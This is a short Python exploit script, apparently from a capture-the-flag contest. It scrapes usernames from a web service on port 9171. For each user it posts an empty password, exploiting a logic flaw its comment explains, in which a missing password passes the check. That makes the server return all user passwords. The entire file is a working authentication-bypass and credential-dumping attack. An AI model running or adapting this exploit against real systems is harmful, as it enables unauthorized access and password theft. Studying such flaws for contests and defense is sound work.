#!/usr/bin/env python3

import re
import sys

import requests

ip = sys.argv[1]

r = requests.get(f'http://{ip}:9171/users/')
users = re.findall('href="/users/([^/]*)/"', r.text)
for user in users:
    print(f'Trying {user}')

    sess = requests.Session()

    # if no password is sent, the check "exists = not password or Password.check(user.username, password)" passes
    # and we get all user passwords
    r = sess.post(f'http://{ip}:9171/users/{user}/', data={'password': None})
    print(r.text, flush=True)
